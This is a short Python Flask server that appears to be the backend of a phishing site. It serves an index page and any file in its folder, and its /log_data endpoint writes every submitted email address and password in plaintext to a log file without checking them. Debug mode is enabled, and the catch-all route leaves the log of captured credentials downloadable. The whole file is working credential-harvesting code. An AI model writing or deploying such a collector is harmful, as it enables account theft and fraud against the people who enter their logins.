from flask import Flask, request, jsonify, send_from_directory, redirect
import datetime
import json

app = Flask(__name__)

LOG_FILE = "server_log.txt"

# ----------------------
# Serve HTML pages
# ----------------------
@app.route("/")
def serve_index():
    return send_from_directory(".", "index.html")

@app.route("/<path:filename>")
def serve_static(filename):
    return send_from_directory(".", filename)

# ----------------------
# Log user data
# ----------------------
@app.route("/log_data", methods=["POST"])
def log_data():
    try:
        data = request.get_json()
        email = data.get("email", "Unknown")
        password = data.get("password", "Unknown")

        # Save login data to log file
        with open(LOG_FILE, "a", encoding="utf-8") as file:
            file.write(f"[{datetime.datetime.now()}] Email: {email}, Password: {password}\n")

        return jsonify({"status": "logged"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    app.run(debug=True, port=8001)
